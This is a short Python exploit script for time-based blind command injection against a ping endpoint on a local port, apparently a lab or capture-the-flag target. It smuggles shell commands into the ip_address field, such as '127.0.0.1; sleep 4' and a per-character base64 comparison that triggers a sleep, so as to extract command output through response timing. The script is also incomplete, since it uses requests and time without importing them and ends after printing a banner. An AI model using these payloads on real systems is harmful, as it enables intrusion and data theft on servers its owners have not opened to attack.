import base64

# Fixed script with proper quote handling
def construct_base64_payload(command, position, char_b64):
    """Construct a payload using base64 comparison to avoid quote issues"""
    # Use single quotes for the f-string to avoid conflicts
    # The shell command will use double quotes internally
    payload = f"127.0.0.1; if [ $(echo -n $({command} | cut -c{position}-{position}) | base64 | tr -d '\\n') = '{char_b64}' ]; then sleep 5; fi"
    return payload

def send_payload(payload):
    """Send payload to the ping endpoint and return response time"""
    try:
        response = requests.post(
            "http://127.0.0.1:32817/ping",
            data={"ip_address": payload},
            timeout=15
        )
        return True, response.text
    except requests.exceptions.Timeout:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

def test_sleep():
    """Test basic sleep command"""
    print("[*] Testing: 127.0.0.1; sleep 4")
    start = time.time()
    success, resp = send_payload("127.0.0.1; sleep 4")
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f} seconds")
    return elapsed >= 4

# Simple test
print("="*60)
print("Blind Command Injection - Simplified Test")
print("="*60)

